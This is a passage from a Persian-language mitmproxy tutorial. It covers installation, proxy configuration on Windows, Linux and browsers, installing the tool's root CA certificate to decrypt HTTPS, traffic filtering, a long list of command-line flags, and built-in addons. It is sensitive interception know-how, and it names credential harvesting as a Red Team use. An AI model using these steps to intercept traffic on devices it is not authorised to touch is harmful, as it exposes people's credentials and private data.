- بهترین روش نصب mitmproxy استفاده از `pipx` است که در تمامی توزیع های لینوکسی در صورت نصب بودن `pipx` قابل استفاده است.
```sh
#نصب mitmproxy
pipx install mitmproxy
#or
python3 -m pipx install mitmproxy

#بررسی موفقیت آمیز بودن نصب با اجرای کامندهای زیر
mitmproxy --version
mitmweb --version
mitmdump --version
```

**روش دوم: نصب از طریق Package Manager**
- ابزار mitmproxy در اکثر مخزن های لینوکسی قرار دارد که برای نصب از این طریق باید به روش زیر عمل کنیم:
```sh
#2.1: Debian Based (Debian, Kali Linux, Ubuntu, ...)
sudo apt install mitmproxy

#2.2: Red-Hat Based (RedHat/CentOS/Fedora/AlmaLinux/Rocky)
sudo dnf install mitmproxy
#or in Old Red-Hat Linux
sudo yum install mitmproxy

#2.3: Arch Linux 
sudo pacman -S mitmproxy
#or using yay (AUR)
sudo yay -S mitmproxy

#2.4: OpenSUSE
sudo zypper install mitmproxy

#Final: Check Installation is Success or Not
mitmproxy --version
mitmweb --version
mitmdump --version
```

**روش سوم: نصب از طریق فایل اجرای(بسته باینری)**
- اگر امکان استفاده از روش های بالا را نداشتید، میتوانی از این روش استفاده کنید.
1. ابتدا آخرین یک نسخه پایدار را از mitmproxy.org پیدا می‌کنیم:
	1. https://www.mintlify.com/mitmproxy/mitmproxy/installation
2. سپس آنرا یا بصورت دستی دانلود میکنیم و یا با استفاده از لینک نسخه مورد نظر و ابزار `wget` آن را از ترمینال دانلود کنیم:
```sh
#جایگزین کردن X.X.X با شماره نسخه معتبر
wget https://snapshots.mitmproxy.org/X.X.X/mitmproxy-X.X.X-linux-x86_64.tar.gz
```
1. در هر حال پس از دانلود فایل `tar.gz.` را از حالت فشرده خارج کنیم:
```sh
#خارج کردن فایل دانلود شده از حالت فشرده
tar -xzf mitmproxy-X.X.X-linux-x86_64.tar.gz
```

2. سپس فایل‌های استخراج‌شده `mitmproxy`, `mitmdump`, `mitmweb` را به دایرکتوری `/usr/local/bin/` منتقل می‌کنیم تا به صورت سراسری در دسترس باشند.
```sh
sudo mv mitmproxy mitmdump mitmweb /usr/local/bin/
```

3. با اجرای دستورات زیر، نصب را تأیید می‌کنیم.
```sh
mitmproxy --version
mitmweb --version
mitmdump --version
```

###### mitmproxy Installation on macOS
در سیستم عامل macOS هم براحتی و با استفاده از یکی از روش های زیر میتوانیم mitmproxy را نصب کنیم.
```sh
#1: Using pipx
pipx install mitmproxy

#2: Using brew Package Manager
brew install mitmproxy
```
###### mitmproxy Using Docker
ابزار mitmproxy را میتوان در Docker و به عنوان یک کانتینر نیز اجرا و استفاده کرد. نام این کانتینر `mitmproxy/mitmproxy` میباشد.

1. **اجرای mitmproxy در حالت TUI(Terminal User Interface):**
```sh
$ docker run --rm -it -v ~/.mitmproxy:/home/mitmproxy/.mitmproxy -p 8080:8080 mitmproxy/mitmproxy
```
- **نکته:** استفاده از فلگ `-v` یا (volume mount) که برای دائمی کردن ذخیره سازی استفاده میشود، اختیاری است. با استفاده از این فلگ میتوانیم از CA Certificates های تولید شده توسط mitmproxy مجددا استفاده کنیم. در غیر اینصورت با هربار ریستارت کانتینر اعتبارنامه ها نیز از بین میروند و در اجرای بعدی نیاز به بازتولید آنها داریم.

با اجرای کامند بالا mitmproxy به HTTP Proxy Server اجرا میشود و به `localhost:8080` گوش میدهد.
```sh
$ http_proxy=http://localhost:8080/ curl http://example.com/
$ https_proxy=http://localhost:8080/ curl -k https://example.com/
```

2. **اجرای `mitmdump`**
	- برای اینکار کافیست `mitmdump` را به آخر کامند اضافه کنیم:
```sh
$ docker run --rm -it -p 8080:8080 mitmproxy/mitmproxy mitmdump
Proxy server listening at http://*:8080
[...]
```

3. **اجرای `mitmweb`:**
	- برای اجرای `mitmweb` باید از پورت 8081 استفاده کنیم:
```sh
$ docker run --rm -it -p 8080:8080 -p 127.0.0.1:8081:8081 mitmproxy/mitmproxy mitmweb --web-host 0.0.0.0
Web server listening at http://0.0.0.0:8081/
No web browser found. Please open a browser and point it to http://0.0.0.0:8081/
Proxy server listening at http://*:8080
[...]
```
- با اجرای کامند بالا پورت 8081 برای ماشین لوکال در دسترس قرار خواهد گرفت.

4. **اجرای ابزار با فلگ ها:**
	- برای اینکارهم کافیست فلگ مورد نظر را به آخر کامند اجرا اضافه کنیم:
```sh
$ docker run --rm -it -p 8080:8080 mitmproxy/mitmproxy mitmdump --set ssl_insecure=true
Proxy server listening at http://*:8080
[...]
```

- **نکته:** اگر فایل زیر در کانتینر وجود داشته باشد، mitmproxy مقادیر uid, gid را از مالک این فایل فرض میکند.
	- `~/.mitmproxy/mitmproxy-ca.pem`

##### Start Using mitmproxy
در این بخش روش رهگیری ترافیک HTTP و HTTPS را بوسیله mitmproxy بصورت قدم به قدم بررسی میکنیم. درواقع اینکار مهمترین و ابتدایی ترین فرآیندی است که mitmproxy انجام میدهد.
###### Step 0: Requirements 
قبل از هر چیز، برای اینکه mitmproxy بتواند تمام ترافیک HTTPS را مشاهده کند، باید:

- مرورگر یا سیستم‌عامل را وادار کنیم از mitmproxy به‌عنوان Proxy استفاده کند.
- **گواهی اعتماد (CA Certificate)** که mitmproxy تولید می‌کند را روی سیستم نصب و Trust کنیم.
- ابزار را در حالت **Regular Proxy** (پیش‌فرض) اجرا کنیم تا از طریق پورت 8080 به درخواست‌ها گوش دهد.

###### Step 1: Run mitmproxy
در ساده‌ترین حالت:
```sh
mitmproxy
```

- **این دستور باعث می‌شود:**
	پراکسی mitmproxy به پورت 8080 گوش دهد.
	در حالت “Regular Proxy” فعال شود.
	ترافیک ورودی به آن، رهگیری و بررسی شود.
	ترافیک HTTPS با TLS Interception رمزگشایی شود (در صورت نصب CA).

###### Step 2: Obtain IP of your Machine
برای اتصال کلاینت‌ها باید آدرس IP سیستم اجراکننده mitmproxy را بدانید. برای اینکار:
```sh
#Linux
ip addr show
#or 
ifconfig

#Windows 
ipconfig
```

با فرض اینکه IP سیستم شما `192.168.1.50` باشد، پراکسی‌ ای که کلاینت‌ها باید تنظیم کنند مانند زیر است:
```sh
HTTP Proxy: 192.168.1.50
Port: 8080
```

###### Step 3: Set Proxy on Browser(OS/Browser)
میتوان مستقیما پراکسی را برروی سیستم عامل تنظیم کرد که با اینکار ترافیک کل سیستم عامل شامل ترافیک مرورگر و سایر ترافیک ها توسط mitmproxy رهگیری میشود. اما اگر میخواهید فقط ترافیک مرورگر توسط mitmproxy رهگیری شود در اینصورت کافیست ترافیک را بر روی مرورگر خود تنظیم کنید. برای تنظیم پراکسی بهترین روش استفاده از افزونه Foxy Proxy است، البته از ویژگی داخلی مرورگر نیز میتوان استفاده کرد.

**نکته:** هنگام تنظیم پراکسی نیاز است که آیپی سیستم عامل که mitmproxy بر روی آن درحال اجراست را در Hostname وارد کنیم. نکته اینجاست که اگر mitmproxy در سیستم خودمان نصب است و قرار است ترافیک سیستم خودمان را رهگیری کند میتوانیم از IP Localhost یعنی 127.0.0.1 بجای آیپی اصلی سیستم استفاده کنیم.

1. **1: تنظیم Proxy روی سیستم‌عامل Windows:**
- **1.1: بوسیله GUI**:
0. در هر دو روش زیر ابتدا باید پنجره RUN را با فشردن همزمان کلیدهای Windows + R باز کنیم و سپس بر اساس ویندوز خود یکی از موارد زیر را در پنجره وارد کنیم و Enter را بفشاریم.
	- Windows 10/11: `ms-settings:network-proxy`
	- Windows XP/7/8: `inetcpl.cpl`
1. سپس برای تنظیم پراکسی در ویندوز های 10/11:
	- Open RUN Windows(Press Windows + R) → `ms-settings:network-proxy` → Enter
	- Enable → Automatically detect settings
	- Use a proxy server → Click on Set up → Turn this On
	- Proxy IP Server: 192.168.1.50
	- Port: 8080
2. سپس برای تنظیم پراکسی در ویندوز های قدیمی تر:
	- Open RUN Windows(Press Windows + R) → `inetcpl.cpl` → Enter
	- Internet Options → Connections → LAN Settings  → Proxy Server
	- Checked  → Use a Proxy server for your LAN
	- Address: http://192.168.1.50
	- Port: 8080
- نکته: اگر mitmproxy برروی سیستم خودمان درحال اجراست میخواهیم ترافیک های سیستم خودمان را برای تحلیل رهگیری کنیم، بجای 192.168.1.50 میتوانیم از 127.0.0.1 استفاده کنیم.

- **1.2: بوسیله کامند netsh**:
```powershell
#Set Proxy
netsh winhttp set proxy 192.168.1.50:8080

#Check Proxy
netsh winhttp show proxy

#Reset to Defual
netsh winhttp reset proxy
```

- **1.3: بوسیله Windows Registry**: تنظیم پراکسی در سطح یوزر
```powershell
#Enable Proxy
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 1

#Set Proxy
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyServer -Value "192.168.1.50:8080"

#Disable Proxy
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 0
```

2. **2: تنظیم Proxy روی سیستم‌عامل Linux:**
- **2.1: تنظیم موقت در Bash**:
```sh
#Set Proxy
export http_proxy=http://192.168.1.50:8080
export https_proxy=http://192.168.1.50:8080

#Check Proxy
echo $http_proxy && echo $https_proxy
```

- **2.2: تنظیم دائمی در `bashrc./~`**:
```sh
#Edit .bashrc
nano ~/.bashrc

#Add below Lines and Close Editor
export http_proxy=http://192.168.1.50:8080
export https_proxy=http://192.168.1.50:8080

#Reload .bashrc to apply changes
source ~/.bashrc

#Check Proxy
echo $http_proxy && echo $https_proxy

```

- **2.3: تنظیم بوسیله GUI(Gnome)**:
- Settings → Network → Proxy → Manual:
	- HTTP Proxy → 192.168.1.50
	- Port → 8080

3. **3: تنظیم مستقیم روی انواع مرورگرها با افزونه Foxy Proxy:**
	- مزیت:
		- تغییر سریع بین Proxy ها
		- تنظیم Proxy برای یک دامنه خاص بوسیله Pattern ها
		- استفاده در تمامی مروگرها(Firefox, Chrome, Brave, ...)
	- مراحل تنظیم:
		1. نصب افزونه FoxyProxy از طریق Web Store | Firefox Extension Store
		2. روی آیکون افزونه در نوار ابزار مرورگر کلیک می‌کنیم و سپس گزینه `Options` را انتخاب میکنیم.
		3. در صفحه باز شده به تب `Proxies` میرویم و برروی `Add` کلیک میکنیم.
		4. سپس مقادیر پراکسی را به صورت زیر تنظیم میکنیم:
			- Title: mitmproxy - نام دلخواه
			- Proxy Type: HTTP
			- IP: 192.168.1.50
			- Port: 8080
		5. اگر بخواهیم پراکسی بر روی دامنه خاصی اعمال شود، Pattern را نیز به شکل زیر مقدار دهی میکنیم:
			- `*google.com*` Proxy only for google.com
			- این روش برای تست هدفمند بسیار کاربردی است.


4. **4: تنظیم مستقیم روی مرورگرها:**
- **4.1: مرورگر Firefox:**
Firefox → Settings → General → Proxy Settings → Configure Proxy
	- Manual Proxy Configuration
	- HTTP Proxy: `192.168.1.50`
	- Port: `8080`
	- Checked "Also use this proxy for HTTPS"
	- Enable → “Use this proxy for all protocols”

- **4.2: مرورگرهای Chrome Base(Chrome/Brave/Vivaldi):**
این مرورگرها مستقیما از تنظیمات سیستم استفاده میکنند.
###### Step 4: Install CA Certificate for HTTPS Tracking
بدون این مرحله، رهگیری وبسایت‌هایی که HTTPS دارند، امکان ندارد. برای نصب گواهی به آدرس اختصاصی mitmproxy میرویم و سپس گواهی را براساس سیستم عامل انتخاب ، دانلود و نصب میکنیم.

1. **مرحله اول: بدست آوردن فایل Certificate**

- **1.1: دانلود Certificate از `http://mitm.it`**
	1. در مرورگر به آدرس `http://mitm.it` میرویم.
	2. سپس براساس نوع سیستم عامل خود Certificate را دانلود میکنیم:
		- Windows Certificate
		- macOS Certificate
		- Linux Certificate
		- Android / iOS (در صورت نیاز)
	- نکته: http://mitm.it در واقع یک Virtual Host است که توسط mitmproxy راه اندازی میشود. بنابراین برای دسترسی به این آدرس باید حتما پراکسی mitmproxy را بر روی سیستم خود تنظیم کرده باشید.

- **1.2: برداشت Certificate از مسیر پیشفرض**
	- اگر به `http://mitm.it` دسترسی نداشتید میتوانیم از این روش برای بدست آوردن Certificate استفاده کنیم.
	1. در سیستم های لینوکس Certificate mitmproxy در مسیر زیر قرار دارد:
		- `~/.mitmproxy/mitmproxy-ca-cert.pem`
	2. در سیستم های ویندوزی Certificate mitmproxy در مسیر زیر قرار دارد:
		- `%USERPROFILE%\.mitmproxy\` یعنی `C:\Users\<username>\.mitmproxy\`
		- پسوند Certificate مربوط به ویندوز `p12.` و `cer` میباشد که در روش های متفاوت استفاده میشوند.

---------

2. **مرحله دوم: نصب Certificate**

- **2.1: نصب در لینوکس های Debian Based**:
```sh
#Move Certificate to Trusted Certificates
sudo cp ~/.mitmproxy/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy.crt
#میتوانیم بجای این گواهی، گواهی دانلود شده را به محل گواهی های مورد اعتماد کپی کنیم.

#Update Certificates
sudo update-ca-certificates
```

- **2.2: نصب در لینوکس های RedHat Based**:
```sh
#Move Certificate to Trusted Certificates
sudo cp ~/.mitmproxy/mitmproxy-ca-cert.pem /etc/pki/ca-trust/source/anchors/

#Update Certificates
sudo update-ca-trust
```

--------

- **2.3: نصب در ویندوز**:

- **2.3.1: نصب بوسیله Certificate دانلود شده از mitm.ir با پسوند `p12.`**
	1. دانلود Certificate از http://mitm.it (یا استفاده از `C:\Users\<username>\.mitmproxy\`)
	2. اجرای فایل `p12.` و وارد کردن گزینه های زیر در Wizard باز شده:
		1. Current User(Also use Local Machine)
		2. Private Key Protection: Checked "Include all extended Properties"
		3. Certificate Store: Checked "Place all certificates in the Following Store" and then "Browse" then Select "Trusted Root Certification Authorities"
		4. Finish
	- **نکته:** Certificate حتما باید در “Trusted Root Certification Authorities” اضافه شود.

- **2.3.2: نصب بوسیله Command Line**
```sh
#Add Certificate
certutil -addstore root C:\path\to\mitmproxy-ca-cert.p12

#Delete Certificate
certutil -delstore root "mitmproxy"
```

- **2.3.2: بوسیله `certmgr.msc` و فایل `mitmproxy-ca-cert.cer`** (روش اضافه)
	1. پنجره RUN(WIN+R) را باز میکنیم و `certmgr.msc` را تایپ کرده و Enter را میفشاریم. 
	2. سپس در پنجره باز شده به `Trusted Root Certification Authorities => Certificates` میرویم. 
	3. سپس در منو بالایی `Actions`  برروی `All Tasks => Import` کلیک میکنیم.
	4. در Wizard باز شده به مسیر `C:\Users\<username>\.mitmproxy\` میرویم و سپس فایل `mitmproxy-ca-cert.cer` را انتخاب میکنیم تا گواهی در ویندوز اضافه شود.

---------

- **2.4: نصب در مرورگرها**
مرورگرهای Chrome Base مانند Brave, Chrome, Vivaldi بصورت پیشفرض از Certificate های سیستم استفاده میکنند. اما در Firefox باید Certificate را بصورت مجزا Import کنیم.

- **2.4.1: وارد کردن Certificate در Firefox**
	- Firefox → Settings → Privacy & Security → Security → Certificates → Manage Certificate → Import → فایل را انتخاب کنید → OK
	- در Firefox میتوان از Certificate با پسوند `pem.` و `cer.` استفاده کرد. (پیشنهاد `pem.`)
###### Step 5: Testing
1. در مرورگر وارد یک وبسایت شوید:
	`https://google.com`

- **اگر همه‌چیز درست باشد:**
	در پنل mitmproxy صفحه مربوط به https://google.com را مشاهده میکنید.
	کل درخواست‌ها و پاسخ‌ها (HTTP Requests & Responses) قابل تحلیل خواهند بود.
	ترافیک HTTPS توسط mitmproxy رمزگشایی شده و نمایش داده می‌شود.

###### Step 6: Apply Simple Filter
در پنل mitmproxy ابتدا کلید `f` را بفشارید و سپس دستور زیر را بزنید:
```
~u google.com
```
این فیلتر، فقط ترافیک‌هایی را نمایش می‌دهد که URL آنها شامل google.com باشد.

همچنین می‌توان از حالت نمایش پیشرفته استفاده کرد. در این روش تمام Sub Domain های مربوط به google.com نیز نمایش داده خواهند شد.
```
~u ".*google\.com.*"
```
###### Step 7: Capture & Save Traffic(Flows)
میتوانیم تمامی ترافیک عبوری که mitmproxy به آنها Flow میگوید را ذخیره کنیم تا بعدا بتوانیم آنها را تحلیل کنیم.
1. برای ذخیره کامل Flow ها:
```sh
mitmproxy -w google.mitm
```

2. برای بارگذاری مجدد آنها:
```sh
mitmproxy -r google.mitm
```

###### Final Results
**در این نقطه ما:**
- ابزار mitmproxy را اجرا کردیم.
- پراکسی را در مرورگر تنظیم کردیم.
- گواهی CA Certificate را نصب کردیم.
- ترافیک HTTPS مثل https://google.com را رهگیری کردیم.
- توانستیم ترافیک را فیلتر و ذخیره کنیم.

این روش در عملیات‌های Red Team برای **Traffic Inspection, Credential Harvesting, API Reverse Engineering** و در Blue Team برای **TLS Visibility و Forensics** کاربرد دارد.
##### mitmproxy Flags 
برای استفاده بهینه از mitmproxy، تسلط بر فلگ‌ها و گزینه‌های خط فرمان آن ضروری است. این فلگ‌ها به ما امکان می‌دهند تا رفتار ابزار را دقیقاً مطابق با سناریوی خود تنظیم کنیم. با اینکه نسخه‌های جدیدتر mitmproxy از یک سیستم یکپارچه بنام `Options` استفاده می‌کنند، اما بسیاری از فلگ‌های کلاسیک همچنان توسط کاربران استفاده میشود. در ادامه لیستی کامل و جامع از این فلگ‌ها را به ترتیب اهمیت و کاربرد مشاهده میکنید. همچنین برای مشاهده کامل‌ترین و به‌روزترین لیست، همواره می‌توانید از فلگ `options--` در هر یک از ابزارها استفاده کنید.


1. `-h`, `--help`  
	راهنمای کامل خط فرمان را به همراه تمامی گزینه‌های موجود نمایش می‌دهد. همواره اولین قدم برای بررسی قابلیت‌های جدید ابزار است.

2. `--version`  
	شماره نسخه برنامه را نمایش داده و خارج می‌شود. 

3. `-p PORT`, `--listen-port PORT`  
	پورتی که پروکسی بر روی آن به اتصالات ورودی گوش می‌دهد را مشخص می‌کند. مقدار پیش‌فرض 8080 است. مثال:
	 `-p 9999`.

4. `-m MODE`, `--mode MODE`  
	حالت عملکرد پروکسی را مشخص می‌کند که حالت پیشفرض آن `regular` میباشد. مقادیر قابل قبول:
	`transparent`، `reverse:http://...`، `upstream:http://...`

5. `-s SCRIPT`, `--script SCRIPT`  
	یک اسکریپت پایتون را برای پردازش خودکار ترافیک بارگذاری می‌کند. یکی از قدرتمندترین قابلیت‌های ابزار است. مثال:
	 `-s my_addon.py`

6. `-r FILE`, `--read-flows FILE`  
	یک فایل ذخیره‌شده از جریان‌های ترافیکی را برای تحلیل آفلاین بارگذاری می‌کند.

7. `-w FILE`, `--write-flows FILE`  
	تمام جریان‌های ترافیکی عبوری را برای تحلیل‌های بعدی در یک فایل ذخیره می‌کند. مثال:
	 `-w traffic.flow`

8. `-i INTERCEPT`, `--intercept INTERCEPT`  
	یک عبارت فیلتر برای توقف و بازبینی تعاملی (Interception) جریان‌های منطبق تعیین می‌کند.مثال:
	`-i "~d example.com"`

9. `-f FILTER`, `--filter FILTER`  
	یک عبارت فیلتر برای نمایش جریان‌ها در واسط کاربری تعیین می‌کند.

10. `-T`, `--transparent` 
	حالت پروکسی شفاف (Transparent Proxy) را فعال می‌کند.

11. `-R REVERSE`, `--reverse REVERSE`  
	حالت پروکسی معکوس (Reverse Proxy) را فعال می‌کند. ترافیک ورودی را به سرور مشخص‌شده هدایت می‌کند. مثال:
	`-R http://localhost:3000`.

12. `-U UPSTREAM`, `--upstream UPSTREAM`  
	تمام درخواست‌ها را به یک پروکسی بالادستی دیگر ارسال می‌کند. مثال:
	 `-U http://proxyserver:8080`

13. `--socks`  
	حالت پروکسی SOCKS5 را فعال می‌کند.

14. `-b ADDR`, `--bind-address ADDR`  
	آدرس IP اینترفیسی که پروکسی به آن مقید می‌شود را مشخص می‌کند. پیش‌فرض به تمام اینترفیس‌ها گوش می‌دهد.

15. `-n`, `--no-server`  
	از شروع یک سرور پروکسی جلوگیری می‌کند. برای مواقعی که فقط به قابلیت‌های پردازش آفلاین نیاز داریم استفاده می‌شود.

16. `--no-http2`  
	پشتیبانی از HTTP/2 را به طور صریح غیرفعال می‌کند.

17. `--anticache` 
	هدرهای درخواستی که ممکن است باعث بازگشت پاسخ 304 ( Not Modified) از سمت سرور شوند را حذف می‌کند تا همواره محتوای تازه دریافت کنیم.

18. `-z`, `--anticomp`  
	سعی می‌کند سرورها را متقاعد کند که داده‌ها را به صورت فشرده‌نشده ارسال کنند.

19. `-Z SIZE`, `--body-size-limit SIZE`  
	حداکثر سایز مجاز برای بدنه درخواست‌ها و پاسخ‌های HTTP را مشخص می‌کند. مثال:
	 `-Z 5m`.

20. `--stream SIZE`  
	اگر بدنه پاسخ از آستانه تعیین‌شده بزرگ‌تر باشد، آن را به صورت جریانی به کلاینت ارسال می‌کند و ذخیره نمی‌کند. مثال:
	 `--stream 1m`

21. `--stickycookie FILTER`  
	یک فیلتر برای چسباندن (Sticky) کوکی تعیین می‌کند، که بر اساس درخواست‌ها اعمال می‌شود.

22. `--stickyauth FILTER`  
	یک فیلتر برای چسباندن اطلاعات احراز هویت تعیین می‌کند.

23. `-I HOST`, `--ignore HOST`  
	میزبان‌هایی که باید بدون پردازش از آن‌ها عبور کرد را مشخص می‌کند. مثال:
	 `-I "\.example\.com$"`

24. `--tcp HOST` 
	یک حالت پروکسی TCP عمومی برای میزبان‌های منطبق فراهم می‌کند.

25. `-q`, `--quiet`  
	خروجی را به حداقل می‌رساند و فقط خطاها را نمایش می‌دهد.

26. `-v`, `--verbose` 
	میزان پرحرفی خروجی را افزایش می‌دهد. در واقع اطلاعات بیشتری را نمایش میدهد.

27. `-e`, `--eventlog`  
	لاگ رویدادها را نمایش می‌دهد.

28. `--follow`  
	لیست جریان‌ها را به صورت خودکار دنبال می‌کند.

29. `--no-mouse`  
	تعامل با ماوس را در واسط متنی غیرفعال می‌کند.

30. `--palette PALETTE`  
	پالت رنگی (تم) واسط متنی را انتخاب می‌کند. مثال:
	 `--palette solarized_dark`

31. `--palette-transparent`  
	پس‌زمینه شفاف برای پالت رنگی تنظیم می‌کند.

32. `--host`  
	از هدر Host برای ساخت URL های نمایشی استفاده می‌کند.

33. `--cert SPEC`  
	یک گواهی SSL سفارشی اضافه می‌کند. مثال:
	 `--cert "*.example.com=/path/to/cert.pem"`.

34. `--cadir CA_DIR`  
	مسیر دایرکتوری حاوی فایل‌های CA پیش‌فرض mitmproxy را مشخص می‌کند.

35. `--insecure`  
	بررسی اعتبار گواهی‌های SSL سرورهای بالادستی را غیرفعال می‌کند. فقط برای محیط‌های آزمایشگاهی کاربرد دارد.

36. `-c PATH`, `--client-replay PATH`  
	درخواست‌های کلاینت را از یک فایل ذخیره‌شده بازپخش می‌کند.

37. `-S PATH`, `--server-replay PATH`  
	پاسخ‌های سرور را از یک فایل ذخیره‌شده بازپخش می‌کند.

38. `-k`, `--replay-kill-extra`  
	درخواست‌های اضافی را در حین بازپخش متوقف می‌کند.

39. `--replace PATTERN`  
	یک الگوی جایگزینی متن (با فرمت `/pattern/regex/replacement`) اعمال می‌کند.

40. `--setheader PATTERN`  
	یک الگوی تنظیم هدر (با فرمت `/pattern/header/value`) اعمال می‌کند.

41. `-a`, `--noapp`
	برنامه onboarding مبتنی بر وب را غیرفعال می‌کند.

42. `--app-host HOST`  
	دامنه‌ای که برنامه onboarding از آن سرو می‌شود.

43. `--app-port PORT`  
	پورتی که برنامه onboarding از آن سرو می‌شود.

44. `--wport PORT`  
	پورت واسط تحت وب `mitmweb` را مشخص می‌کند.

45. `--wiface IFACE` 
	اینترفیس شبکه برای `mitmweb` را مشخص می‌کند.

46. `--sysinfo` 
	اطلاعات سیستمی را نمایش می‌دهد و خارج می‌شود.

47. `--shortversion`  
	شماره نسخه کوتاه برنامه را نمایش می‌دهد و خارج می‌شود.

48. `--conf CONFIG_FILE`  
	مسیر فایل کانفیگ را مشخص می‌کند.

49. `--upstream-auth UPSTREAM_AUTH`  
	اطلاعات احراز هویت برای پروکسی بالادستی را تعیین می‌کند. مثال:
	 `--upstream-auth user:pass`

50. `--spoof-source-address`  
	از IP کلاینت برای اتصالات سمت سرور استفاده می‌کند.

51. `--raw-tcp` / `--no-raw-tcp`  
	پشتیبانی از raw tcp را فعال/غیرفعال می‌کند.

52. `--websockets` / `--no-websockets` 
	پشتیبانی از WebSocket را فعال/غیرفعال می‌کند.

53. `--singleuser USER` 
	دسترسی به پروکسی را به یک کاربر مشخص محدود می‌کند.مثال:
	 `--singleuser admin:pass123`

54. `--nonanonymous`  
	اجازه دسترسی به هر کاربری که اطلاعات احراز هویت ارائه دهد را می‌دهد.

55. `--htpasswd PATH` 
	دسترسی را بر اساس یک فایل htpasswd آپاچی کنترل می‌کند.

56. `--client-certs CLIENT_CERTS` 
	مسیر فایل یا دایرکتوری گواهی‌های کلاینت را مشخص می‌کند.

57. `--no-upstream-cert` 
	برای بررسی جزئیات گواهی، به سرور بالادستی متصل نمی‌شود.

58. `--ciphers-client CIPHERS`  
	رمزهای پشتیبانی‌شده برای اتصالات کلاینت را تنظیم می‌کند.

59. `--ssl-version-client VERSION` 
	نسخه‌های SSL/TLS پشتیبانی‌شده برای اتصالات کلاینت را تنظیم می‌کند.

60. `--ssl-version-server VERSION` 
	نسخه‌های SSL/TLS پشتیبانی‌شده برای اتصالات سرور را تنظیم می‌کند.

61. `--upstream-trusted-cadir CA_DIR` 
	مسیر دایرکتوری CAهای معتبر برای تأیید سرور بالادستی.

62. `--upstream-trusted-ca CA_CERT` 
	مسیر یک فایل PEM حاوی CA معتبر.

63. `--replay-ignore-content` 
	در حین بازپخش، محتوای درخواست را برای یافتن جریان ذخیره‌شده نادیده می‌گیرد.

64. `--replay-ignore-host` 
	میزبان مقصد درخواست را برای یافتن جریان ذخیره‌شده نادیده می‌گیرد.

65. `--replay-ignore-param PARAM` 
	پارامترهای خاص درخواست را برای یافتن جریان ذخیره‌شده نادیده می‌گیرد.

66. `--replay-ignore-payload-param PARAM`  
	پارامترهای payload (مانند فرم‌ها) را برای یافتن جریان ذخیره‌شده نادیده می‌گیرد.

67. `--rheader RHEADERS`  
	هدرهای درخواستی که در بازپخش (Replay) سرور باید مد نظر قرار گیرند.

68. `--norefresh` 
	بازنویسی مقادیر زمان در کوکی‌ها و هدرها را در بازپخش غیرفعال می‌کند.

69. `--no-pop`  
	غیرفعال‌سازی حذف پاسخ از جریان، که امکان بازپخش چندباره یک پاسخ را فراهم می‌کند.

70. `--add-upstream-certs-to-client-chain`  
	گواهی‌های سرور بالادستی را به زنجیره گواهی ارائه‌شده به کلاینت اضافه می‌کند.

71. `--server-replay-use-header HEADER`  
	هدر خاصی که باید در بازپخش سرور استفاده شود را مشخص می‌کند.

##### mitmproxy Built-in Addons
تمامی قابلیت‌های اصلی و پیشرفته mitmproxy از طریق یک سیستم یکپارچه و ماژولار از افزونه‌ها (Addons) پیاده‌سازی شده‌اند. این معماری، قلب تپنده ابزار است و نه تنها آن را بسیار انعطاف‌پذیر کرده، بلکه به ما نیز این امکان را می‌دهد که با نوشتن افزونه‌های شخصی، رفتار پروکسی را دقیقاً مطابق با سناریوی تست نفوذ یا تحلیل خود، توسعه دهیم.
در لیست زیر، مهم‌ترین افزونه‌های داخلی را که با اجرای پیش‌فرض ابزار فعال هستند، به همراه توضیحات کامل، تشریح می‌کنیم. 
###### `Proxyserver`
- **توضیح تئوری:** این افزونه، مسئول اصلی مدیریت چرخه حیات سرور پروکسی است. این که چگونه به اتصالات گوش دهیم، آن‌ها را بپذیریم و بر اساس حالت (Regular, Transparent و غیره) پردازش کنیم، همگی بر عهده `Proxyserver` است.
    
- **سناریوی استفاده:** هر بار که ما mitmproxy را با یک حالت مشخص مانند `m transparent-` اجرا می‌کنیم، در واقع در حال پیکربندی این افزونه هستیم. سناریوی رایج، راه‌اندازی یک پروکسی شفاف برای رهگیری ترافیک دستگاهی است که قابلیت تنظیم پروکسی ندارد.
    
- **مکانیزم عملکرد:** این افزونه، سرورهای TCP/UDP لازم را ایجاد کرده و `ConnectionHandler` را برای مدیریت هر اتصال جدید صدا می‌زند. همچنین فرمان های تزریق پیام به اتصالات فعال (مثلاً `inject.websocket`) را فراهم می‌کند.
    
- **روش پیاده‌سازی و استفاده:** برای نمونه، راه‌اندازی یک پروکسی معکوس با این افزونه به صورت زیر انجام می‌شود:
```sh
mitmproxy --mode reverse:http://localhost:3000 -p 8080
```

این دستور، `Proxyserver` را وادار می‌کند تا یک سرور در پورت 8080 ایجاد کند که تمام ترافیک ورودی به آن را به آدرس `http://localhost:3000` هدایت کند.

###### `TlsConfig`
- **توضیح:** افزونه `TlsConfig`، متخصص رمزنگاری در mitmproxy است. وظیفه اصلی آن، مدیریت تمامی جنبه‌های مرتبط با پروتکل TLS/SSL برای رهگیری و رمزگشایی ترافیک HTTPS است. این افزونه، گواهی‌های دیجیتال جعلی را به صورت خودکار تولید کرده، مذاکرات TLS بین کلاینت و سرور را مدیریت کرده و پارامترهای امنیتی مانند نسخه‌های TLS و رمزهای پشتیبانی‌شده را کنترل می‌کند.
    
- **سناریوی استفاده:** مهم‌ترین سناریوی این افزونه، "رهگیری HTTPS" است. فرض کنیم می‌خواهیم ترافیک رمزنگاری‌شده یک اپلیکیشن موبایل را تحلیل کنیم. پس از نصب گواهی CA مخصوص mitmproxy بر روی دستگاه، این افزونه به صورت خودکار برای هر دامنه‌ای که اپلیکیشن با آن ارتباط برقرار می‌کند، یک گواهی معتبر جعل کرده و ارتباطی امن بین خود و دستگاه ایجاد می‌کند. سپس محتوای درخواست را رمزگشایی کرده و پس از تحلیل، یک اتصال TLS جدید به سمت سرور اصلی برقرار می‌کند.
    
- **مکانیزم عملکرد:** `TlsConfig` دارای دو بخش اصلی است: مدیریت ارتباط با کلاینت و مدیریت ارتباط با سرور. این افزونه به رویدادهایی مانند `tls_clienthello` گوش می‌دهد و مشخصات اتصال درخواستی کلاینت را تحلیل می‌کند. بر اساس گواهی‌های موجود در `certificate store`، یک گواهی مناسب برای دامنه مورد نظر پیدا کرده یا می‌سازد و در فرآیند دست‌دهی TLS (Handshake) استفاده می‌کند.
    
